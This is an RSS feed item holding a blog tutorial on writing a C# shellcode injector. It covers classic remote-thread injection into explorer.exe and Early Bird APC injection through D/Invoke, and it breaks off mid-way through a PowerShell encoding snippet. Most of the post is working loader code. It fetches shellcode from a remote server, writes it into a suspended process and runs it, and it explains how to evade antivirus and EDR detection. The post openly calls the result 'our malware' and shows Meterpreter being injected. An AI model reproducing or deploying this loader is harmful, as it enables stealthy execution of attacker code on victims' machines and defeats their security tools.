<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Jake Mai</title><link>https://jakemai0.github.io/posts/</link><description>Recent content in Posts on Jake Mai</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0&lt;/a></copyright><lastBuildDate>Fri, 13 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://jakemai0.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Process Injection with D/Invoke - Part 1</title><link>https://jakemai0.github.io/posts/processinjection_0/</link><pubDate>Fri, 13 Jan 2023 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/processinjection_0/</guid><description>Introduction In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let&amp;rsquo;s improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.
I won&amp;rsquo;t be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understand the content much better.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let&rsquo;s improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.</p>
<p>I won&rsquo;t be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understand the content much better.</p>
<h2 id="pinvoke">P/Invoke</h2>
<p>Before talking about D/Invoke, let&rsquo;s briefly talk about P/Invoke.
On a high level, <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">P/Invoke</a> - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the <code>System</code> and <code>System.Runtime.InteropServices</code> namespaces). Combine with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the <code>OpenProcess</code> Win32API:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>Define<span style="color:#960050;background-color:#1e0010">&#39;</span> the OpenProcess API <span style="color:#66d9ef">from</span> kernel32.dll
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[DllImport(&#34;kernel32.dll&#34;, SetLastError = true, ExactSpelling = true)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">uint</span> processAccess,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">bool</span> bInheritHandle,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> processID);
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> Open a handle to <span style="color:#960050;background-color:#1e0010">&#39;</span>explorer.exe<span style="color:#960050;background-color:#1e0010">&#39;</span> with OpenProcess.
</span></span><span style="display:flex;"><span>IntPtr hProcess = OpenProcess(<span style="color:#ae81ff">0x001F0FFF</span>, <span style="color:#66d9ef">false</span>, Process.GetProcessesByName(<span style="color:#e6db74">&#34;explorer&#34;</span>)[<span style="color:#ae81ff">0</span>].Id);
</span></span></code></pre></div><p>Okay neat, we can import and call any API we want, so what&rsquo;s the downside?</p>
<ol>
<li>Any API import via P/Invoke is a static reference and will be visible in the . NET assembly&rsquo;s Import Address Table (IAT). This is bad OPSEC since the IAT entries will be populated at run time, with all the references to the APIs we&rsquo;re about to call. Suspicious API calls considered by AV/EDR to be usual suspects such as <code>VirtualAlloc</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code> will be caught immediately. It&rsquo;s like going through airport security with bag full of explosives, you want to get caught at this point.</li>
<li>API hooking (specific API calls monitored by AV/EDR) also busts suspicious API calls, we would need to avoid the usage of the more &ldquo;obvious&rdquo; APIs. D/Invoke provides Manual Mapping as a solution to bypass API hooking, but we won&rsquo;t be covering it in this post.</li>
</ol>
<h2 id="dinvoke">D/Invoke</h2>
<p><a href="https://github.com/TheWover/DInvoke">D/Invoke</a> - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies the ability to dynamically invoke unmanaged APIs:</p>
<ul>
<li>Load a DLL into memory</li>
<li>Get a pointer to a function/API in that DLL</li>
<li>Call desired API using the pointer while passing in parameters
This is the standard usage of D/Invoke and will avoid directly importing the APIs into our .NET Assembly&rsquo;s IAT.</li>
</ul>
<p>To do this, D/Invoke works with <a href="https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/">Delegates</a>. I&rsquo;m probably not the best at explaining Delegates since this is my first time doing development in C#, but in my understanding, <code>Delegates</code> allows wrapping functions within a class, API calls can now be declared as a class and be used later on. Here is an example of D/Invoke usage to call the <code>VirtualAllocEx</code> Win32API:</p>
<p>Make a new class and create a Delegate for <code>VirtualAllocEx</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DELEGATES</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>To call this Delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.VirtualAllocEx virAllocEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualAllocEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualAllocEx;
</span></span><span style="display:flex;"><span>IntPtr allocret = virAllocEx(procInfo.hProcess, IntPtr.Zero, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>, <span style="color:#ae81ff">0x40</span>); <span style="color:#75715e">//MEM_COMMIT | MEM_RESERVE</span>
</span></span></code></pre></div><ol>
<li>Get the pointer to <code>VirtualAllocEx</code> in <code>kernel32.dll</code> via the helper function <code>GetLibraryAddress</code>.</li>
<li>Use <code>GetDelegateForFunctionPointer</code> to convert the function pointer into a delegate and cast it with the same delegate type.</li>
<li>Call the API/Instantiate the delegate.</li>
</ol>
<p><em>In this blog post series, I won&rsquo;t be importing the whole D/Invoke project, but only take the neccessary helper functions, structs and enums</em></p>
<h2 id="project-injection-101">Project Injection 101</h2>
<p>Project Injection is a commonly used technique to inject our shellcode into legitimate target process&rsquo;s virtual memory space. A textbook way to perform project injection is:</p>
<ol>
<li>Find a target process to inject our shellcode into and get a handle to it with <code>OpenProcess</code></li>
<li>Allocate a new memory region in the remote target process using <code>VirtualAllocEx</code></li>
<li>Write our shellcode into the allocated remote memory region using <code>WriteProcessMemory</code></li>
<li>Execute our shellcode as a new thread with <code>CreateRemoteThread</code></li>
</ol>
<p>Here is a PoC to inject shellcode into <code>explorer.exe</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#75715e">// Get pid of explorer.exe</span>
</span></span><span style="display:flex;"><span>Process[] explorerProcess = Process.GetProcessesByName(<span style="color:#e6db74">&#34;explorer&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Open a handle to explorer.exe</span>
</span></span><span style="display:flex;"><span>IntPtr hProcess = OpenProcess(<span style="color:#ae81ff">0x001F0FFF</span>, <span style="color:#66d9ef">false</span>, explorerProcess[<span style="color:#ae81ff">0</span>].Id);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocate remote mem</span>
</span></span><span style="display:flex;"><span>IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x3000</span>, <span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 0x3000 = MEM_COMMIT | MEM_RESERVE (0x1000 | 0x2000)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 0x40: PAGE_EXECUTE_READWRITE (RWX)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// shellcode</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] buf = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">511</span>] {<span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x48</span>,...,<span style="color:#ae81ff">0xd5</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IntPtr outSize;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Write shellcode to allocated buffer</span>
</span></span><span style="display:flex;"><span>WriteProcessMemory(hProcess, addr, buf, buf.Length, <span style="color:#66d9ef">out</span> outSize);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Execute thread</span>
</span></span><span style="display:flex;"><span>IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, <span style="color:#ae81ff">0</span>, addr, IntPtr.Zero, <span style="color:#ae81ff">0</span>, IntPtr.Zero);
</span></span></code></pre></div><p>This injection method works, however, it has a lot of flaws and can be easily picked up. The most obvious red flag  is the <code>PAGE_EXECUTE_READWRITE (RWX)</code> with <code>VirtualAllocEx</code>, as most memory regions in the process has <strong>RX</strong> protection, allocating memory for our shellcode with Read, Write and Execute (RWX) will make it more than obvious to AV/EDR.

    <img src="/images/explorer_11888.png"  alt="Meterpreter shellcode injected into explorer.exe"  class="center"  style="border-radius: 8px;"  />


<em>Meterpreter shellcode was injected successfully into explorer.exe</em></p>
<p>
    <img src="/images/explorer_bad_injection.png"  alt="RWX region stood out"  class="center"  style="border-radius: 8px;"  />


<em>RWX region containing the shellcode stood out</em></p>
<p>This injection could also be detected by this <a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2">Get-InjectedThread</a> script:

    <img src="/images/injection_caught.png"  alt="Injection detected"  class="center"  style="border-radius: 8px;"  />


<em>Injection detected</em></p>
<p>Additionally, <code>CreateRemoteThread</code> API is heavily scrutinized by AV/EDR as this is commonly seen in injection techniques to create a thread that runs in a remote process&rsquo;s virtual memory space.</p>
<h2 id="early-bird-process-injection-with-dinvoke">Early Bird Process Injection with D/Invoke</h2>
<p>Let&rsquo;s improve our injection method with a technique called Early Bird (circa 2018), a variant of APC Queue Injection.
On a high level:</p>
<ol>
<li>Spawn a new process to inject into and put it in suspended state using <code>CreateProcess</code></li>
<li>Allocate memory buffer in the target process with <code>RW</code> flag using <code>VirtualAllocEx</code></li>
<li>Write shellcode in the target buffer using <code>WriteProcessMemory</code></li>
<li>Change the target memory region to <code>RX</code> in order for our shellcode to execute using <code>VirtualProtectEx</code></li>
<li>Queue a thread, pointing the APC object to the shellcode in the target buffer</li>
<li>Resume thread to start the shellcode execution</li>
</ol>
<p>Let&rsquo;s implement this injection using D/Invoke.
First of all, as mentioned above, I won&rsquo;t be importing the whole D/Invoke project but only taking necessary functions, structs and enums from <a href="https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke">D/Invoke GitHub</a>.
At the time of writing, the list of functions from D/Invoke source code that I have are:</p>
<ul>
<li><code>DynamicAPIInvoke</code>: Invoke an arbitrary function from a DLL dynamically, providing its name, function prototype, and arguments.</li>
<li><code>DynamicFunctionInvoke</code>: Invoke an arbitrary function from a pointer, called by <code>DynamicAPIInvoke</code>.</li>
<li><code>GetLibraryAddress</code>: Helper for getting the pointer to a function from a DLL loaded by the process.</li>
<li><code>GetLoadedModuleAddress</code>: Helper for getting the base address of a module loaded by the current process.</li>
<li><code>LoadModuleFromDisk</code>: Resolve <code>LdrLoadDll</code> and uses that function to load a DLL from disk.</li>
<li><code>GetExportAddress</code>: Resolves the address of a function by manually walking the module export table, given a module base address.
We also need to define <code>RtlInitUnicodeString</code> and <code>LdrLoadDll</code> from <code>ntdll.dll</code>, also referenced on <a href="https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Native.cs">D/Invoke GitHub</a> (LdrLoadDll is an undocumented ntdll native API)</li>
</ul>
<p>Structs and Enums to include:</p>
<ul>
<li><code>NTSTATUS</code>: <a href="https://dinvoke.net/en/ntdll/NTSTATUS">Undocumented Enum</a></li>
<li><code>UNICODE_STRING</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string">Documented Struct</a></li>
<li><code>PROCESS_INFORMATION</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information">Documented Struct</a></li>
<li><code>STARTUPINFO</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa">Documented Struct</a></li>
<li><code>ProcessCreationFlags</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">Documented Enum</a></li>
</ul>
<p>Once all this Ctrl+C and Ctrl+V is done, we can start creating Delegates for the APIs, following the documentations for these APIs from Microsoft.</p>
<p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DELEGATES</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> CreateProcess(<span style="color:#66d9ef">string</span> lpApplicationName, <span style="color:#66d9ef">string</span> lpCommandLine, IntPtr lpProcessAttributes,
</span></span><span style="display:flex;"><span>		IntPtr lpThreadAttributes, <span style="color:#66d9ef">bool</span> bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> lpCurrentDirectory, <span style="color:#66d9ef">ref</span> STRUCTS.STARTUPINFO lpStartupInfo, <span style="color:#66d9ef">out</span> STRUCTS.PROCESS_INFORMATION lpProcessInformation);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//......</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, <span style="color:#66d9ef">byte</span>[] lpBuffer, <span style="color:#66d9ef">uint</span> nSize, <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex">VirtualProtectEx</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">int</span> dwSize, <span style="color:#66d9ef">uint</span> flNewProtect, <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex">QueueUserAPC</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">uint</span> ResumeThread(IntPtr hThhread);
</span></span></code></pre></div><p>Creating delegate for <code>LdrLoadDll</code> (This is an undocumented native API, go to <a href="http://undocumented.ntinternals.net/">http://undocumented.ntinternals.net/</a> and search for LdrLoadDll)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, <span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING ModuleFileName, <span style="color:#66d9ef">ref</span> IntPtr ModuleHandle);
</span></span></code></pre></div><p>Creating delegate for <a href="https://www.pinvoke.net/default.aspx/ntdll/RtlInitUnicodeString.html">RtlInitUnicodeString</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">void</span> RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] <span style="color:#66d9ef">string</span> SourceString);
</span></span></code></pre></div><p>We can now start invoking the APIs through the delegates in our Main() function.
We can either store our (encrypted)shellcode on within the assembly or download it from a remote server.
To download the shellcode from a remote server, we need the <code>System.Net.Http</code> namespace, and create a <code>HttpClient</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] shellcode;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> recv = <span style="color:#66d9ef">new</span> HttpClient()) {
</span></span><span style="display:flex;"><span>  shellcode = recv.GetByteArrayAsync(<span style="color:#e6db74">&#34;https://x.x.x.x/shellcode.bin&#34;</span>).GetAwaiter().GetResult();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>startInfo</code> and <code>procInfo</code> store process information such as process handle and thread handle:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>STRUCTS.STARTUPINFO startInfo = <span style="color:#66d9ef">new</span> STRUCTS.STARTUPINFO();
</span></span><span style="display:flex;"><span>STRUCTS.PROCESS_INFORMATION procInfo = <span style="color:#66d9ef">new</span> STRUCTS.PROCESS_INFORMATION();
</span></span></code></pre></div><p>Invoke Create Process through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>IntPtr pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;CreateProcessA&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.CreateProcess)) <span style="color:#66d9ef">as</span> DELEGATES.CreateProcess;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Spawn new process in suspended state</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> yayornay = createProc(<span style="color:#e6db74">&#34;process_path_here&#34;</span>, <span style="color:#66d9ef">null</span>, IntPtr.Zero, IntPtr.Zero, <span style="color:#66d9ef">false</span>, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED,
</span></span><span style="display:flex;"><span>IntPtr.Zero, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">ref</span> startInfo, <span style="color:#66d9ef">out</span> procInfo);
</span></span></code></pre></div><p>Invoke VirtualAllocEx through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualAllocEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualAllocEx;
</span></span><span style="display:flex;"><span>IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>, <span style="color:#ae81ff">0x04</span>); <span style="color:#75715e">//MEM_COMMIT | MEM_RESERVE; 0x04: RW</span>
</span></span></code></pre></div><p>Invoke WriteProcessMemory through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;WriteProcessMemory&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.WriteProcessMemory)) <span style="color:#66d9ef">as</span> DELEGATES.WriteProcessMemory;
</span></span><span style="display:flex;"><span>writeProcMem(procInfo.hProcess, allocret, sheocode, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#66d9ef">out</span> UIntPtr bytesWritten);
</span></span></code></pre></div><p>Invoke VirtualProtectEx through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualProtectEx&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualProtectEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualProtectEx;
</span></span><span style="display:flex;"><span>virProtEx(procInfo.hProcess, allocret, sheocode.Length, <span style="color:#ae81ff">0x20</span>, <span style="color:#66d9ef">out</span> oldProtect); <span style="color:#75715e">// 0x20: RX</span>
</span></span></code></pre></div><p>Invoke QueueUserAPC through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;QueueUserAPC&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.QueueUserAPC)) <span style="color:#66d9ef">as</span> DELEGATES.QueueUserAPC;
</span></span><span style="display:flex;"><span>qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
</span></span></code></pre></div><p>Invoke ResumeThread through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;ResumeThread&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.ResumeThread)) <span style="color:#66d9ef">as</span> DELEGATES.ResumeThread;
</span></span><span style="display:flex;"><span>resThrd(procInfo.hThread);
</span></span></code></pre></div><p>Build our .NET assembly as a x64 executable.
To load our assembly in the target&rsquo;s memory, let&rsquo;s gzip compress and then base64 encode the assembly&rsquo;s byte stream, output it to <code>compressedEncodedBytes.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$bytes = [<span style="color:#66d9ef">System.IO.File</span>]::ReadAllBytes(<span style="color:#e6db74">&#34;</span>$(pwd)<span style="color:#e6db74">\injection.exe&#34;</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.IO.MemoryStream</span>] $outStream = New-Object System.IO.MemoryStream
</span></span><span style="display:flex;"><span>$gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [<span style="color:#66d9ef">System.IO.Compression.CompressionMode</span>]::Compress)
</span></span><span style="display:flex;"><span>$gzipStream.Write($bytes, <span style="color:#ae81ff">0</span>, $bytes.Length)
</span></span><span style="display:flex;"><span>$gzipStream.Close()
